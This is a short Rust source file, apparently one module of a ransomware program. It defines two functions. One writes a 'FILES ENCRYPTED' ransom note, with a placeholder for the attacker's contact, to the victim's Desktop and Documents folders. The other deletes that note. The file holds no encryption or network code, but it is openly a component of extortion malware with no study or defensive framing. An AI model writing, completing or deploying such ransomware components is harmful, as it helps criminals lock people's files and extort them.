// src/ransom.rs
use std::fs;
use std::path::PathBuf;

pub fn create_ransom_note() {
    let note = r#"
=== FILES ENCRYPTED ===
Your files have been encrypted.
To decrypt, run the program and enter the password.
Contact: [YOUR CONTACT HERE]
"#;
    
    if let Some(desktop) = dirs::desktop_dir() {
        let note_path = desktop.join("RANSOM_NOTE.txt");
        let _ = fs::write(note_path, note);
    }
    
    if let Some(documents) = dirs::document_dir() {
        let note_path = documents.join("RANSOM_NOTE.txt");
        let _ = fs::write(note_path, note);
    }
}

pub fn remove_ransom_note() {
    if let Some(desktop) = dirs::desktop_dir() {
        let _ = fs::remove_file(desktop.join("RANSOM_NOTE.txt"));
    }
    
    if let Some(documents) = dirs::document_dir() {
        let _ = fs::remove_file(documents.join("RANSOM_NOTE.txt"));
    }
}
